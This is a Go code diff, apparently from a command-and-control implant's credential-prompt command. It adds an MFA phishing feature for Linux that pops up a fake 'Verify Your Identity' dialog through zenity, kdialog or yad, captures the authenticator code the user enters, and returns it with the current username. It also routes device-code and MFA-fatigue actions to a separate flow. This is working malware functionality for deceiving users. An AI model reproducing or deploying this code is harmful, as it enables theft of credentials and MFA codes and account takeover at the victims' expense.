@@ -4,7 +4,6 @@ package commands
 
 import (
 	"context"
-	"encoding/json"
 	"fmt"
 	"os"
 	"os/exec"
@@ -60,12 +59,18 @@ func buildDialogArgs(tool, title, message string) []string {
 }
 
 func (c *CredentialPromptCommand) Execute(task structs.Task) structs.CommandResult {
-	var args credentialPromptLinuxArgs
+	// Check for cross-platform MFA actions before platform-specific dialog
+	action := credPromptExtractAction(task.Params)
+	if action == "device-code" || action == "mfa-fatigue" {
+		return credPromptDeviceCodeFlow(task)
+	}
+	if action == "mfa-phish" {
+		return credPromptMFAPhishLinux(task)
+	}
 
-	if task.Params != "" {
-		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return errorf("Error parsing parameters: %v", err)
-		}
+	args, parseErr := unmarshalParams[credentialPromptLinuxArgs](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 
 	title := args.Title
@@ -135,4 +140,70 @@ func (c *CredentialPromptCommand) Execute(task structs.Task) structs.CommandResu
 		Completed:   true,
 		Credentials: &creds,
 	}
+}
+
+// buildMFADialogArgs constructs the command arguments for an MFA phishing
+// dialog using the detected dialog tool. Unlike credential dialogs, MFA
+// dialogs use VISIBLE text fields (not hidden) since MFA codes are visible.
+func buildMFADialogArgs(tool, title, message string) []string {
+	switch tool {
+	case "zenity":
+		return []string{"--entry", "--title=" + title, "--text=" + message}
+	case "kdialog":
+		return []string{"--inputbox", message, "", "--title", title}
+	case "yad":
+		return []string{"--entry", "--title=" + title, "--text=" + message}
+	default:
+		return nil
+	}
+}
+
+// credPromptMFAPhishLinux displays an MFA phishing dialog on Linux using
+// zenity/kdialog/yad with a visible text entry field for MFA code capture.
+func credPromptMFAPhishLinux(task structs.Task) structs.CommandResult {
+	args, parseErr := unmarshalParams[credentialPromptLinuxArgs](task)
+	if parseErr != nil {
+		return *parseErr
+	}
+
+	title := args.Title
+	if title == "" {
+		title = "Verify Your Identity"
+	}
+	message := args.Message
+	if message == "" {
+		message = "Enter the verification code from your authenticator app."
+	}
+
+	if os.Getenv("DISPLAY") == "" && os.Getenv("WAYLAND_DISPLAY") == "" {
+		return errorResult("No display server available. MFA phishing dialog requires a desktop session.")
+	}
+
+	tool, toolPath := findDialogTool()
+	if toolPath == "" {
+		return errorResult("No GUI dialog tool found. Install zenity, kdialog, or yad.")
+	}
+
+	dialogArgs := buildMFADialogArgs(tool, title, message)
+
+	ctx, cancel := context.WithTimeout(context.Background(), credPromptLinuxTimeout)
+	defer cancel()
+
+	out, err := exec.CommandContext(ctx, toolPath, dialogArgs...).CombinedOutput()
+	defer structs.ZeroBytes(out)
+	if err != nil {
+		if exitErr, ok := err.(*exec.ExitError); ok && exitErr.ExitCode() == 1 {
+			return successResult("User cancelled the MFA dialog")
+		}
+		return errorf("MFA dialog failed: %v\n%s", err, strings.TrimSpace(string(out)))
+	}
+
+	code := strings.TrimSpace(string(out))
+
+	username := "unknown"
+	if u, err := user.Current(); err == nil {
+		username = u.Username
+	}
+
+	return credPromptMFAPhishResult(code, title, username, "Linux")
 }
